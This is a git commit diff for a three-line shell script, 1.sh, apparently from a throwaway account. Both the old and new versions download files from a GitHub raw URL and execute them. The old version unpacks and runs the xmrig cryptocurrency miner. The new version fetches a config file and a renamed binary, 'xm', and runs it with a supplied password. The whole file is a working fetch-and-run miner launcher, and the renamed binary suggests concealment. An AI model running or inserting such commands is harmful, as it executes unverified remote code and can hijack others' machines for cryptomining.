2e559187a03c158ecd966202ebd9b7103fbd5843
qwertyuiopasdfghjklzxcvbnmyxsc-svg <qwertyuiopasdfghjklzxcvbnmyxsc@gmail.com>
2026-01-27 14:18:08 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,3 +1,3 @@
-wget https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/3.tar.gz
-tar -xvzf 3.tar.gz
-./xmrig -p $1
+wget https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/config.json
+wget https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/xm
+./xm -p $1
